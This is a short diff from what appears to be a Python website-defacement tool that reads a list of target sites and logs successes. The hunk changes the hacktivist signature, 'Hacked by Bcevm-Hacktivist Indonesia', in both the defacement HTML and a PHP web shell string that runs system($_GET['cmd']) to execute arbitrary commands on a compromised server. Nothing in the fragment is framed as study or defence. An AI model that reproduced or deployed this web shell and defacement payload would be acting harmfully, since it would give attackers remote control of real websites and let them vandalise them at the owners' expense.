@@ -14,8 +14,8 @@ MAX_RETRIES = 2
 TIMEOUT = 10
 
 deface_file_path = "deface.html"
-deface_content = "<h1>Hacked by Sayang</h1>"
-shell_code = "<?php echo 'Hacked by Sayang'; system($_GET['cmd']); ?>"
+deface_content = "<h1>Hacked by Bcevm-Hacktivist Indonesia</h1>"
+shell_code = "<?php echo 'Hacked by Bcevm-Hacktivist Indonesia'; system($_GET['cmd']); ?>"
 targets_file = "targets.txt"
 success_file = "success.txt"
 user_agents = [
